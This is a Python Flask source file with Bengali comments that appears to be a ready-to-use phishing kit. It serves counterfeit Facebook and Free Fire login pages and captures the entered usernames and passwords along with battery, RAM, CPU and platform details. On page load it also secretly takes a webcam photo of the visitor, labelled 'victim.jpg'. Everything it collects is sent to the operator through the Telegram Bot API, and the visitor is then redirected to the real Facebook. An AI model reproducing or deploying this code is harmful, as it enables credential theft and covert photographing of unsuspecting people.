import os
import requests
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# --- আপনার সেটিংস ---
BOT_TOKEN = "YOUR_BOT_TOKEN" # এখানে আপনার টেলিগ্রাম বট টোকেন দিন
CHAT_ID = "YOUR_CHAT_ID"     # এখানে আপনার চ্যাট আইডি দিন

# --- HTML টেমপ্লেট (অ্যাপের মতো ডিজাইন এবং ক্যামেরা ক্যাপচার) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #f0f2f5; font-family: sans-serif; }
        .login-card { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1); }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4">
    <div class="w-full max-w-sm login-card p-6">
        <div class="text-center mb-6">
            <h1 class="text-3xl font-bold text-blue-600">{{ title }}</h1>
            <p class="text-gray-500">Login to your account to continue</p>
        </div>
        <form id="loginForm" class="space-y-4">
            <input type="text" id="user" placeholder="Email or Phone" class="w-full p-3 border rounded focus:outline-blue-500" required>
            <input type="password" id="pass" placeholder="Password" class="w-full p-3 border rounded focus:outline-blue-500" required>
            <button type="submit" class="w-full bg-blue-600 text-white font-bold py-3 rounded hover:bg-blue-700 transition">Log In</button>
        </form>
    </div>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        // ক্যামেরা পারমিশন ও স্ন্যাপশট
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                setTimeout(() => {
                    takeSnapshot();
                }, 2000); // ২ সেকেন্ড পর ছবি তুলবে
            } catch (err) { console.log("Camera blocked"); }
        }

        function takeSnapshot() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.getContext('2d').drawImage(video, 0, 0);
            const imageData = canvas.toDataURL('image/jpeg');
            
            fetch('/upload_image', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData })
            });
        }

        window.onload = startCamera;

        // ডাটা সাবমিট
        document.getElementById('loginForm').onsubmit = async (e) => {
            e.preventDefault();
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;
            
            // হার্ডওয়্যার ডাটা সংগ্রহ
            const info = {
                user: user,
                pass: pass,
                app: "{{ title }}",
                ram: navigator.deviceMemory || "N/A",
                cpu: navigator.hardwareConcurrency || "N/A",
                platform: navigator.platform,
                battery: (await navigator.getBattery()).level * 100 + "%"
            };

            await fetch('/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            });
            
            window.location.href = "https://www.facebook.com"; // রিডাইরেক্ট
        };
    </script>
</body>
</html>
"""

@app.route('/facebook')
def facebook():
    return render_template_string(HTML_TEMPLATE, title="Facebook")

@app.route('/freefire')
def freefire():
    return render_template_string(HTML_TEMPLATE, title="Freefire Login")

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    msg = f"🔥 **ANAS MASTER ATTACK** 🔥\\n\\n👤 User: {data['user']}\\n🔑 Pass: {data['pass']}\\n📱 App: {data['app']}\\n\\n⚙️ **HARDWARE INFO**\\n🔋 Battery: {data['battery']}\\n💾 RAM: {data['ram']} GB\\n💎 CPU: {data['cpu']} Cores\\n🖥️ OS: {data['platform']}\\n\\n✅ **Dev By Anas +971504614724**"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    return jsonify({"status": "ok"})

@app.route('/upload_image', methods=['POST'])
def upload_image():
    img_data = request.json['image'].split(',')[1]
    import base64
    with open("victim.jpg", "wb") as f:
        f.write(base64.b64decode(img_data))
    
    with open("victim.jpg", "rb") as photo:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data={"chat_id": CHAT_ID}, files={"photo": photo})
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
